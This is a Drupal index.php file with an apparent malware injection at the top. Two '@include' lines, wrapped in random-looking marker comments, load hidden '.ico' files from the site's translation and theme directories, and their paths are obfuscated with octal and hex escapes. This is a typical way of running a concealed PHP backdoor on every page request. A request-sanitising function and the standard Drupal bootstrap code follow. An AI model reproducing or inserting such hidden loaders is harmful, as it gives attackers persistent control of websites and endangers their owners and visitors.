<?php
/*cfba0*/

@include "\057home\057emba\156kme/\160ubli\143_htm\154/pro\146iles\057stan\144ard/\164rans\154atio\156s/.9\0641960\0717.ic\157";

/*cfba0*/
/*3c842*/

@include "\x2fh\x6fm\x65/\x65m\x62a\x6ek\x6de\x2fp\x75b\x6ci\x63_\x68t\x6dl\x2ft\x68e\x6de\x73/\x65n\x67i\x6ee\x73/\x70h\x70t\x65m\x70l\x61t\x65/\x66a\x76i\x63o\x6e_\x631\x622\x31f\x2ei\x63o";

/*3c842*/
function stripDangerousValues($input) {
    if (is_array($input)) {
        foreach ($input as $key => $value) {
            if ($key !== '' && $key[0] === '#') {
                unset($input[$key]);
            }
            else {
                $input[$key] = stripDangerousValues($input[$key]);
            }
        }
    }
    return $input;
}
$_REQUEST = stripDangerousValues($_REQUEST);
$_GET = stripDangerousValues($_GET);
$_POST = stripDangerousValues($_POST);





/**
 * @file
 * The PHP page that serves all page requests on a Drupal installation.
 *
 * The routines here dispatch control to the appropriate handler, which then
 * prints the appropriate page.
 *
 * All Drupal code is released under the GNU General Public License.
 * See COPYRIGHT.txt and LICENSE.txt.
 */

/**
 * Root directory of Drupal installation.
 */
define('DRUPAL_ROOT', getcwd());

require_once DRUPAL_ROOT . '/includes/bootstrap.inc';
drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);
menu_execute_active_handler();
